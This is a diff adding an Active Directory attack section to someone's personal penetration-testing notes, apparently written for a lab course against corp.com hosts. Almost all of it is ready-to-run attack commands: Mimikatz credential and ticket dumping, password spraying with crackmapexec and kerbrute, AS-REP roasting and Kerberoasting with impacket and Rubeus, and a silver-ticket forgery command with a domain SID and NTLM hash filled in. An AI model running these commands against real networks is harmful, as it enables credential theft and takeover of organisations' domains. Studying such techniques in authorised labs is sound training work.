@@ -446,4 +446,33 @@ ACTIVE DIRECTORY:
             download sharphound on compromised windows
             import-module .\sharphound.ps1
             Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"
-            
+
+Atak:
+    Mimi:
+
+        privilege::debug
+        sekurlsa::logonpasswords
+        sekurlsa::tickets
+
+    Password Attacks:
+        net accounts (for lockout info)
+        crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
+        Kerbrute:
+            .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
+    AS-REP Roasting:
+        Get-DomainUser -PreauthNotRequired
+        On Linux:
+            impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
+        on WIndows:
+            .\Rubeus.exe asreproast /nowrap
+    Kerberoasting:
+        Win:
+            .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+        Lin:
+            sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete 
+    Silver Tickets:
+        gotta collect SPN Password hash, Domain SID, Target SPN
+        1. Mimikatz ntlm hash: privilege::debug sekurlsa::logonapsswords
+        2. whoami /user ( except last 4 digits, we just need domain SID )
+        3. target SPN: server name + domain name: web04.corp.com
+        kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
